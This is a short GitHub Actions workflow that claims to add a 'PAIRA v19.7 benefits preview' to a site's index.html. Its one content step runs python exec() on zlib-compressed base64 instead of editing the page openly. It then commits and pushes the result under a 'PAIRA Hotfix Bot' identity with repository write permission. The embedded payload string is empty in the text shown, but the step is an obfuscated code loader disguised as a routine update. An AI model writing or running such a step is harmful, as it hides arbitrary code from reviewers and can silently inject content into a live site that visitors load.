name: PAIRA v19.7 benefits preview

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/paira-v19-7-benefits.yml'

permissions:
  contents: write

jobs:
  patch-index:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Add PAIRA benefits preview
        shell: bash
        run: |
          python -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('')))"

      - name: Commit benefits preview
        shell: bash
        run: |
          git config user.name "PAIRA Hotfix Bot"
          git config user.email "actions@users.noreply.github.com"
          git add index.html
          git commit -m "Add PAIRA benefits preview"
          git push
